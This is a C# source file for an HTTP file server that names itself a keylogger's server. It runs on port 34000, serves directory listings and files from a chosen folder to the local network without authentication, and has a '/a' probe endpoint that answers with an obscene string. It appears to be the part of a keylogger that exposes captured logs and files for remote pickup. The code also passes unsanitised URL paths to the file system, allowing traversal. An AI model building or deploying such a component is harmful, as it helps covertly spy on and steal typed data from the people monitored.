using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.Net;
using System.IO;
using System.Threading;
using System.Diagnostics;

namespace KeyLogger_
{
    class SimpleHTTPServer
    {
        private readonly string[] _indexFiles = 
        {
            "index.html",
            "index.htm",
            "default.html",
            "default.htm"
        };
        private String _servername = "Keylogger HTTP server at {addr} port {port}";
        private static IDictionary<string, string> _mimeTypeMappings = new Dictionary<string, string>(StringComparer.InvariantCultureIgnoreCase) 
        {
        #region extension to MIME type list
            {".asf", "video/x-ms-asf"},
            {".asx", "video/x-ms-asf"},
            {".avi", "video/x-msvideo"},
            {".bin", "application/octet-stream"},
            {".cco", "application/x-cocoa"},
            {".crt", "application/x-x509-ca-cert"},
            {".css", "text/css"},
            {".deb", "application/octet-stream"},
            {".der", "application/x-x509-ca-cert"},
            {".dll", "application/octet-stream"},
            {".dmg", "application/octet-stream"},
            {".ear", "application/java-archive"},
            {".eot", "application/octet-stream"},
            {".exe", "application/octet-stream"},
            {".flv", "video/x-flv"},
            {".gif", "image/gif"},
            {".hqx", "application/mac-binhex40"},
            {".htc", "text/x-component"},
            {".htm", "text/html"},
            {".html", "text/html"},
            {".ico", "image/x-icon"},
            {".img", "application/octet-stream"},
            {".iso", "application/octet-stream"},
            {".jar", "application/java-archive"},
            {".jardiff", "application/x-java-archive-diff"},
            {".jng", "image/x-jng"},
            {".jnlp", "application/x-java-jnlp-file"},
            {".jpeg", "image/jpeg"},
            {".jpg", "image/jpeg"},
            {".js", "application/x-javascript"},
            {".mml", "text/mathml"},
            {".mng", "video/x-mng"},
            {".mov", "video/quicktime"},
            {".mp3", "audio/mpeg"},
            {".mpeg", "video/mpeg"},
            {".mpg", "video/mpeg"},
            {".msi", "application/octet-stream"},
            {".msm", "application/octet-stream"},
            {".msp", "application/octet-stream"},
            {".pdb", "application/x-pilot"},
            {".pdf", "application/pdf"},
            {".pem", "application/x-x509-ca-cert"},
            {".pl", "application/x-perl"},
            {".pm", "application/x-perl"},
            {".png", "image/png"},
            {".prc", "application/x-pilot"},
            {".ra", "audio/x-realaudio"},
            {".rar", "application/x-rar-compressed"},
            {".rpm", "application/x-redhat-package-manager"},
            {".rss", "text/xml"},
            {".run", "application/x-makeself"},
            {".sea", "application/x-sea"},
            {".shtml", "text/html"},
            {".sit", "application/x-stuffit"},
            {".swf", "application/x-shockwave-flash"},
            {".tcl", "application/x-tcl"},
            {".tk", "application/x-tcl"},
            {".txt", "text/plain"},
            {".war", "application/java-archive"},
            {".wbmp", "image/vnd.wap.wbmp"},
            {".wmv", "video/x-ms-wmv"},
            {".xml", "text/xml"},
            {".xpi", "application/x-xpinstall"},
            {".zip", "application/zip"},
            {".log", "text/plain"}
        #endregion
        };
        private Thread _serverThread;
        private string _rootDirectory;
        private HttpListener _listener;
        private int _port;

        public int Port
        {
            get { return _port; }
            private set { }
        }

        public SimpleHTTPServer(string path, int port)
        {
            this.Initialize(path, port);
        }

        public SimpleHTTPServer(string path)
        {
            //get an empty port
            TcpListener l = new TcpListener(IPAddress.Loopback, 0);
            l.Start();
            int port = ((IPEndPoint)l.LocalEndpoint).Port;
            l.Stop();
            port = 34000;
            this.Initialize(path, port);
        }

        public void Stop()
        {
            _serverThread.Abort();
            _listener.Stop();
        }

        private void Listen()
        {
            _listener = new HttpListener();
            _listener.Prefixes.Add($"http://{_currentAddress}:{_port.ToString()}/a");
            _listener.Prefixes.Add($"http://127.0.0.1:{_port.ToString()}/a");
            _listener.Prefixes.Add($"http://{_currentAddress}:{_port.ToString()}/");
            _listener.Prefixes.Add($"http://127.0.0.1:{_port.ToString()}/");
            _listener.Start();
            while (true)
            {
                try
                {
                    HttpListenerContext context = _listener.GetContext();
                    if (context.Request.Url.ToString().EndsWith("/a"))
                    {
                        context.Response.StatusCode = 204;
                        byte[] x = System.Text.Encoding.Default.GetBytes("HUI PIZDA");
                        context.Response.OutputStream.Write(x, 0, x.Length);
                        continue;
                    }
                    Process(context);
                }
                catch (Exception ex)
                {

                }
            }
        }

        private String _currentAddress = "";
        private void _InitAddr()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    _currentAddress = ip.ToString();
                }
            }
        }
        private string DirectoryList(String directory, String rel)
        {
            String html = $"<!DOCTYPE HTML PUBLIC \" -//W3C//DTD HTML 3.2 Final//EN\"><html><head><title>Index of /{rel} </title></head><body><h1>Index of /{rel}</h1><br><br><table>";
            bool _isRoot = false;
            if (String.IsNullOrWhiteSpace(rel))
            {
                rel = "/";
                _isRoot = true;
            }
            else if (rel.Trim(" \r\n".ToCharArray()) == "/")
            {
                _isRoot = true;
            }
            else if (rel.StartsWith("/"))
            {

            }
            else
            {
                rel = "/" + rel;
            }
            if (!_isRoot)
            {
                html += $"<tr><td valign=\"top\"><img src=\"http://www.ibiblio.org/icons/back.gif\"></td><td><a href=\"http://{_currentAddress + $":{Port.ToString()}" + "/"}/\">Root directory/</a></td></tr>";
            }
            foreach (var ci in Directory.EnumerateDirectories(directory))
            {
                DirectoryInfo di = new DirectoryInfo(ci);
                html += $"<tr><td valign=\"top\"><img src=\"http://www.ibiblio.org/icons/folder.gif\"></td><td><a href=\"http://{_currentAddress + $":{Port.ToString()}" + rel + "/" + di.Name}/\">{di.Name}/</a></td></tr>";
            }
            foreach (var ci in Directory.EnumerateFiles(directory))
            {
                FileInfo fi = new FileInfo(ci);
                html += $"<tr><td valign=\"top\"><img src=\"http://www.ibiblio.org/icons/text.gif\"></td><td><a href=\"http://{_currentAddress + $":{Port.ToString()}" + rel + "/" + fi.Name}\">{fi.Name}</a></td></tr>";
            }
            html += $"</table><br><br><br><address>{_servername.Replace("{addr}", _currentAddress).Replace("{port}", Port.ToString())}</address></body></html>";
            return html.Replace("//", "/").Replace("//", "/").Replace("http:/", "http://");
        }
        private void Process(HttpListenerContext context)
        {
            string filename = context.Request.Url.AbsolutePath;
            Console.WriteLine(filename);
            filename = filename.Substring(1);
            if (File.Exists(Path.Combine(_rootDirectory, filename)))
            {
                //If it's file, we'll return its contents. Now do nothing
                
            }
            else if (Directory.Exists(Path.Combine(_rootDirectory, filename)))
            {
                //Directory listing
                File.Delete("__temp_dlist.html");
                File.WriteAllText("__temp_dlist.html", DirectoryList(Path.Combine(_rootDirectory, filename), filename));
                filename = "__temp_dlist.html";
            }
            if (string.IsNullOrEmpty(filename))
            {
                foreach (string indexFile in _indexFiles)
                {
                    if (File.Exists(Path.Combine(_rootDirectory, indexFile)))
                    {
                        filename = indexFile;
                        break;
                    }
                }
            }

            filename = Path.Combine(_rootDirectory, filename);

            if (File.Exists(filename))
            {
                try
                {
                    Stream input = new FileStream(filename, FileMode.Open);

                    //Adding permanent http response headers
                    string mime;
                    context.Response.ContentType = _mimeTypeMappings.TryGetValue(Path.GetExtension(filename), out mime) ? mime : "application/octet-stream";
                    context.Response.ContentLength64 = input.Length;
                    context.Response.AddHeader("Date", DateTime.Now.ToString("r"));
                    context.Response.AddHeader("Last-Modified", System.IO.File.GetLastWriteTime(filename).ToString("r"));

                    byte[] buffer = new byte[1024 * 16];
                    int nbytes;
                    while ((nbytes = input.Read(buffer, 0, buffer.Length)) > 0)
                        context.Response.OutputStream.Write(buffer, 0, nbytes);
                    input.Close();

                    context.Response.StatusCode = (int)HttpStatusCode.OK;
                    context.Response.OutputStream.Flush();
                }
                catch (Exception ex)
                {
                    context.Response.StatusCode = (int)HttpStatusCode.InternalServerError;
                }

            }
            else
            {
                context.Response.StatusCode = (int)HttpStatusCode.NotFound;
            }

            context.Response.OutputStream.Close();
        }
        
        private void Initialize(string path, int port)
        {
            this._rootDirectory = path;
            this._port = port;
            _InitAddr();
            _serverThread = new Thread(this.Listen);
            _serverThread.Start();
        }

        
    }
}
